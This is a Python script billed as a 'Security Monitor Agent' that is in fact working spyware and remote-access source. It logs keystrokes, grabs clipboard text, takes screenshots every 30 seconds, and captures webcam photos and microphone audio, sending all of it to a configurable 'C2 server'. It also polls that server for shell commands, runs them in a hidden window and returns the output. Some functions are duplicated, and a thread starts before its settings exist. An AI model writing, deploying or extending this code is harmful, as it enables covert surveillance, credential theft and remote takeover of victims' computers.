#!/usr/bin/env python3
"""
Complete Security Monitor Agent v4.0
Features: Keylogger, Screenshots, Webcam, Clipboard, Audio, Screen Switches,
          Remote Lock, Reverse Shell
"""

import requests
import time
import threading
import platform
import socket
import os
import sys
import base64
import json
import uuid
import subprocess
from datetime import datetime
import socket
# Add at the top with other imports
import ctypes
from ctypes import wintypes

# Windows API constants
PBT_APMRESUMEAUTOMATIC = 0x0012
PBT_APMRESUMESUSPEND = 0x0007
WM_POWERBROADCAST = 0x0218

# Create a hidden window to receive power events (simplified approach)
def monitor_power_events():
    """Monitor for system resume events"""
    print("[✓] Power event monitor started")
    last_check = time.time()
    
    while True:
        time.sleep(5)
        
        # Check if system time jumped (indicates hibernation/sleep)
        now = time.time()
        if now - last_check > 60:  # Time jump of more than 60 seconds
            print("[!] System wake detected! Reconnecting...")
            reconnect()
            # Force a heartbeat
            try:
                headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
                requests.post(f"{SERVER_URL}/api/heartbeat",
                             json={'device_id': DEVICE_ID, 'timestamp': time.time()},
                             headers=headers,
                             timeout=10)
                print("[✓] Heartbeat sent after wake")
            except:
                pass
        
        last_check = now

# Start this thread in main()
threading.Thread(target=monitor_power_events, daemon=True).start()

def is_connected():
    """Check if we can actually reach the C2 server"""
    try:
        # Try to establish a real connection
        socket.create_connection((SERVER_URL.replace("http://", "").split(":")[0], 5000), timeout=5)
        return True
    except:
        return False

def reconnect():
    """Force re-register the device"""
    print("[!] Connection lost! Reconnecting...")
    try:
        headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
        info = get_device_info()
        requests.post(f"{SERVER_URL}/api/info", json=info, headers=headers, timeout=10)
        print("[✓] Reconnected successfully!")
        return True
    except Exception as e:
        print(f"[-] Reconnect failed: {e}")
        return False

# ==================== CONFIGURATION ====================
SERVER_URL = "http://Your_Host_IP_Address"  # Change to your VPS IP
DEVICE_ID = None
# =======================================================

# Force working directory to script location
os.chdir(os.path.dirname(os.path.abspath(__file__)))

def get_device_info():
    """Get system information"""
    return {
        'device_id': DEVICE_ID,
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'public_ip': requests.get('https://api.ipify.org', timeout=5).text if requests else 'unknown',
        'os': platform.system(),
        'os_version': platform.version(),
        'user': os.getlogin(),
        'cpu': platform.processor(),
        'machine': platform.machine()
    }

def register_device():
    """Register this device with the C2 server"""
    global DEVICE_ID
    DEVICE_ID = str(uuid.uuid4())[:16]
    info = get_device_info()
    try:
        headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
        resp = requests.post(f"{SERVER_URL}/api/info", json=info, headers=headers, timeout=10)
        if resp.status_code == 200:
            print(f"[+] Registered successfully! Device ID: {DEVICE_ID}")
            return True
    except Exception as e:
        print(f"[-] Registration error: {e}")
    print(f"[*] Using Device ID: {DEVICE_ID}")
    return False

# ==================== KEYLOGGER ====================
def send_keystrokes(text):
    """Send keystrokes to server"""
    if not text:
        return
    try:
        headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
        requests.post(f"{SERVER_URL}/api/keystrokes", 
                     json={'device_id': DEVICE_ID, 'text': text},
                     headers=headers,
                     timeout=5)
        print(f"[+] Keys: {text[:50]}")
    except Exception as e:
        print(f"[-] Keystroke error: {e}")

def keylogger_loop():
    """Capture keyboard input"""
    try:
        from pynput import keyboard
        buffer = []
        
        def on_press(key):
            try:
                if hasattr(key, 'char') and key.char:
                    buffer.append(key.char)
                else:
                    key_name = str(key).replace('Key.', '')
                    buffer.append(f'[{key_name}]')
            except:
                buffer.append(f'[{key}]')
            
            if len(buffer) >= 30:
                send_keystrokes(''.join(buffer))
                buffer.clear()
        
        def on_release(key):
            pass
        
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        print("[✓] Keylogger started")
        
        # Send buffer every 30 seconds even if not full
        while True:
            time.sleep(30)
            if buffer:
                send_keystrokes(''.join(buffer))
                buffer.clear()
    except Exception as e:
        print(f"[-] Keylogger error: {e}")

# ==================== SCREENSHOTS ====================
def send_screenshot():
    """Capture and send screenshot"""
    try:
        import pyautogui
        import io
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_b64 = base64.b64encode(img_bytes.getvalue()).decode()
        headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
        requests.post(f"{SERVER_URL}/api/screenshot",
                     json={'device_id': DEVICE_ID, 'image': img_b64},
                     headers=headers,
                     timeout=10)
        print("[✓] Screenshot sent")
    except Exception as e:
        print(f"[-] Screenshot error: {e}")

# ==================== WEBCAM ====================
def send_webcam():
    """Capture and send webcam photo"""
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[-] Webcam not available")
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            img_b64 = base64.b64encode(buffer.tobytes()).decode()
            headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
            requests.post(f"{SERVER_URL}/api/webcam",
                         json={'device_id': DEVICE_ID, 'image': img_b64},
                         headers=headers,
                         timeout=10)
            print("[✓] Webcam sent")
    except Exception as e:
        print(f"[-] Webcam error: {e}")

# ==================== CLIPBOARD ====================
def send_clipboard():
    """Monitor and send clipboard changes"""
    try:
        import pyperclip
        old_text = ""
        print("[✓] Clipboard monitor started")
        while True:
            time.sleep(2)
            try:
                text = pyperclip.paste()
                if text and text != old_text and len(text) > 5:
                    old_text = text
                    headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
                    requests.post(f"{SERVER_URL}/api/clipboard",
                                 json={'device_id': DEVICE_ID, 'text': text[:1000]},
                                 headers=headers,
                                 timeout=5)
                    print(f"[✓] Clipboard: {text[:50]}")
            except:
                pass
    except Exception as e:
        print(f"[-] Clipboard error: {e}")

# ==================== AUDIO ====================
def record_audio(duration=10):
    """Record microphone audio"""
    try:
        import pyaudio
        import wave
        import io
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                       input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK, exception_on_overflow=False)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        wav_buffer = io.BytesIO()
        with wave.open(wav_buffer, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        
        return base64.b64encode(wav_buffer.getvalue()).decode()
    except Exception as e:
        print(f"[-] Audio recording error: {e}")
        return None

def send_audio():
    """Record and send audio to server"""
    try:
        audio_b64 = record_audio(10)
        if audio_b64:
            headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
            requests.post(f"{SERVER_URL}/api/audio",
                         json={'device_id': DEVICE_ID, 'audio': audio_b64, 'duration': 10},
                         headers=headers,
                         timeout=15)
            print("[✓] Audio sent")
    except Exception as e:
        print(f"[-] Audio send error: {e}")

# ==================== SCREEN SWITCHES ====================
last_window = None

def check_window_switch():
    """Detect when user switches between windows"""
    global last_window
    try:
        import win32gui
        print("[✓] Window switch monitor started")
        while True:
            try:
                hwnd = win32gui.GetForegroundWindow()
                window_title = win32gui.GetWindowText(hwnd)
                if window_title and window_title != last_window:
                    headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
                    requests.post(f"{SERVER_URL}/api/screen_switch",
                                 json={'device_id': DEVICE_ID, 'to': window_title, 'from': last_window or 'none'},
                                 headers=headers,
                                 timeout=5)
                    print(f"[✓] Window switched: {window_title[:50]}")
                    last_window = window_title
            except:
                pass
            time.sleep(2)
    except ImportError:
        print("[-] win32gui not installed - screen switch monitoring disabled")
    except Exception as e:
        print(f"[-] Window switch error: {e}")

# ==================== COMMAND HANDLER (UPDATED - FIXED FOR USB REMOVED) ====================
def check_commands():
    """Poll server for commands with automatic recovery"""
    print("[✓] Command handler started")
    consecutive_failures = 0
    
    while True:
        try:
            # Check connection first
            if not is_connected():
                print("[!] Command poll: No connection, waiting...")
                time.sleep(10)
                continue
            
            resp = requests.get(
                f"{SERVER_URL}/api/poll?device_id={DEVICE_ID}",
                timeout=10
            )
            
            if resp.status_code == 200:
                consecutive_failures = 0
                cmd = resp.json()
                
                # Lock command
                if cmd.get('lock'):
                    print("[!] LOCK command received!")
                    try:
                        import ctypes
                        ctypes.windll.user32.LockWorkStation()
                        print("[✓] Laptop locked")
                    except Exception as e:
                        print(f"[-] Lock failed: {e}")
                
                # Shell command
                elif cmd.get('shell_command'):
                    shell_cmd = cmd.get('shell_command')
                    print(f"[!] SHELL command: {shell_cmd}")
                    
                    try:
                        import subprocess
                        import os
                        
                        cmd_exe = r"C:\Windows\System32\cmd.exe"
                        
                        if os.path.exists(cmd_exe):
                            result = subprocess.run(
                                [cmd_exe, '/c', shell_cmd],
                                capture_output=True,
                                text=True,
                                timeout=30,
                                shell=False,
                                cwd="C:\\",
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                        else:
                            result = subprocess.run(
                                shell_cmd,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30,
                                cwd="C:\\"
                            )
                        
                        output = result.stdout + result.stderr
                        if output:
                            headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
                            requests.post(f"{SERVER_URL}/api/command_result",
                                         json={'device_id': DEVICE_ID, 'result': output[:5000]},
                                         headers=headers,
                                         timeout=10)
                            print(f"[✓] Shell output sent ({len(output)} bytes)")
                        else:
                            print("[✓] Command executed (no output)")
                            
                    except subprocess.TimeoutExpired:
                        print("[-] Shell command timed out")
                    except Exception as e:
                        print(f"[-] Shell error: {e}")
                
                # Screenshot command
                elif cmd.get('take_screenshot'):
                    print("[!] Screenshot command received")
                    send_screenshot()
            
            else:
                consecutive_failures += 1
                
        except requests.exceptions.ConnectionError:
            print("[!] Command poll: Connection lost")
            consecutive_failures += 1
            time.sleep(5)
            
        except Exception as e:
            print(f"[-] Command poll error: {e}")
            consecutive_failures += 1
        
        # If repeated failures, try to reconnect
        if consecutive_failures >= 3:
            print("[!] Command poll: Multiple failures, attempting reconnect...")
            reconnect()
            consecutive_failures = 0
            
        time.sleep(3)

# ==================== HEARTBEAT ====================
def send_heartbeat():
    """Send periodic heartbeat with connection check"""
    global DEVICE_ID
    consecutive_failures = 0
    
    while True:
        time.sleep(30)
        try:
            # Check if we can actually reach the server
            if not is_connected():
                print("[!] Heartbeat: No network connection to C2 server")
                consecutive_failures += 1
                
                if consecutive_failures >= 2:
                    print("[!] Multiple failures - attempting full reconnect")
                    if reconnect():
                        consecutive_failures = 0
                continue
            
            # Send heartbeat
            headers = {'Content-Type': 'application/json', 'X-Device-Id': DEVICE_ID}
            resp = requests.post(
                f"{SERVER_URL}/api/heartbeat",
                json={'device_id': DEVICE_ID, 'timestamp': time.time()},
                headers=headers,
                timeout=10
            )
            
            if resp.status_code == 200:
                consecutive_failures = 0
            else:
                consecutive_failures += 1
                
        except requests.exceptions.ConnectionError:
            print("[!] Heartbeat: Connection refused - server may be down")
            consecutive_failures += 1
            
            if consecutive_failures >= 3:
                print("[!] Server unreachable - will retry later")
                
        except Exception as e:
            print(f"[-] Heartbeat error: {e}")
            consecutive_failures += 1
            
        # If too many failures, try to re-register
        if consecutive_failures >= 5:
            print("[!] Too many heartbeat failures - re-registering...")
            register_device()
            consecutive_failures = 0
            
def monitor_power_events():
    """Monitor for system resume events using time jump detection"""
    print("[✓] Power event monitor started")
    last_check = time.time()
    
    while True:
        time.sleep(5)
        now = time.time()
        if now - last_check > 60:  # Time jump > 60 seconds = system woke up
            print("[!] System wake detected! Reconnecting...")
            reconnect()
        last_check = now
# ==================== MAIN ====================
def main():
    print("="*60)
    print("  Security Monitor Agent v4.0")
    print("  Protecting your laptop from unauthorized access")
    print("="*60)
    print(f"  Server: {SERVER_URL}")
    print("="*60)
    
    # Register with server
    register_device()
    
    # Start all monitoring modules
    print("\n[*] Starting monitoring modules...")
    
    # Keylogger
    threading.Thread(target=keylogger_loop, daemon=True).start()
    
    # Clipboard
    threading.Thread(target=send_clipboard, daemon=True).start()
    
    # Commands (lock, shell)
    threading.Thread(target=check_commands, daemon=True).start()
    
    # Heartbeat
    threading.Thread(target=send_heartbeat, daemon=True).start()
    
    # Window switches (requires pywin32)
    threading.Thread(target=check_window_switch, daemon=True).start()
    
    # Audio (requires pyaudio)
    def audio_loop():
        time.sleep(10)  # Wait for system to stabilize
        while True:
            send_audio()
            time.sleep(60)  # Every 60 seconds
    threading.Thread(target=audio_loop, daemon=True).start()
    
    # Power event monitor (detects wake from hibernation/sleep)
    threading.Thread(target=monitor_power_events, daemon=True).start()
    
    # Wait a bit then send initial captures
    time.sleep(5)
    print("\n[*] Taking initial captures...")
    send_screenshot()
    send_webcam()
    
    # Periodic captures
    last_screenshot = time.time()
    last_webcam = time.time()
    
    print("\n" + "="*60)
    print("  ✅ AGENT RUNNING SUCCESSFULLY")
    print("  Press Ctrl+C to stop")
    print("="*60 + "\n")
    
    try:
        while True:
            time.sleep(1)
            
            # Screenshot every 30 seconds
            if time.time() - last_screenshot >= 30:
                send_screenshot()
                last_screenshot = time.time()
            
            # Webcam every 2.5 minutes (150 seconds)
            if time.time() - last_webcam >= 150:
                send_webcam()
                last_webcam = time.time()
                
    except KeyboardInterrupt:
        print("\n[*] Stopping agent...")
        sys.exit(0)

if __name__ == "__main__":
    main()